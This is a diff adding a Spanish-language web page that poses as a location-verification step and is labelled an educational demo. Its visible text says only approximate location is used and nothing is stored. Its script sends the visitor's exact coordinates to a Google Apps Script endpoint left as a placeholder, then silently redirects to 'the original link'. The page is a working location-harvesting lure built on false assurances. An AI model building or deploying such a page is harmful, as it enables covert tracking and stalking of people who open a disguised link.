@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificación de Ubicación</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: linear-gradient(135deg, #0f172a, #1e293b);
+      color: #e5e7eb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #020617;
+      padding: 32px;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 50px rgba(0,0,0,.6);
+      text-align: center;
+      animation: fadeIn .8s ease;
+    }
+
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: .95rem;
+      line-height: 1.5;
+      color: #cbd5e1;
+      margin-bottom: 20px;
+    }
+
+    .info {
+      background: #020617;
+      border: 1px solid #1e293b;
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      font-size: .85rem;
+      color: #94a3b8;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(135deg, #38bdf8, #6366f1);
+      color: #020617;
+      cursor: pointer;
+      font-weight: 600;
+      transition: transform .15s ease, box-shadow .15s ease;
+    }
+
+    button:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 25px rgba(99,102,241,.4);
+    }
+
+    footer {
+      margin-top: 18px;
+      font-size: .75rem;
+      color: #64748b;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h1>Verificación de Ubicación</h1>
+    <p>
+      Esta página forma parte de una demostración educativa sobre cómo funciona
+      la geolocalización en la web.
+    </p>
+
+    <div class="info">
+      ✔ Solo se usará tu ubicación aproximada.<br>
+      ✔ No se guarda información personal.<br>
+      ✔ Puedes salir cuando quieras.
+    </div>
+
+    <button onclick="getLocation()">Aceptar y continuar</button>
+
+    <footer>
+      Proyecto educativo — Zahir Anthony
+    </footer>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (!navigator.geolocation) {
+        alert("Tu navegador no soporta geolocalización.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          // 👉 Enviar al Google Apps Script
+          fetch("AQUI_PEGA_TU_URL_DEL_SCRIPT", {
+            method: "POST",
+            body: JSON.stringify({ lat, lon })
+          });
+
+          // 👉 Redirigir al link original
+          window.location.href = "https://example.com";
+        },
+        err => {
+          alert("No se pudo obtener la ubicación.");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
